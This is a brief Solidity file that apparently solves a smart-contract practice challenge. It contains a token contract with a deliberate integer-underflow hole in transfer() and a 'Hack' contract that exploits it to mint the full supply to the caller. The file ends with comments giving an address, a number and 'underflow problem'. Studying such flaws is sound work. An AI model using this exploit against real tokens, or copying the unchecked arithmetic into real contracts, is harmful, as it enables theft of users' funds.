// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Hack {
    function attack(Token _token) external {
        uint total = _token.totalSupply();
        _token.transfer(msg.sender, total);
        require(_token.balanceOf(msg.sender) > 20);
    }
}

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
//0xced3c912133e108174AEb8dEAaACB1E1D420e497
//21000000
//underflow problem
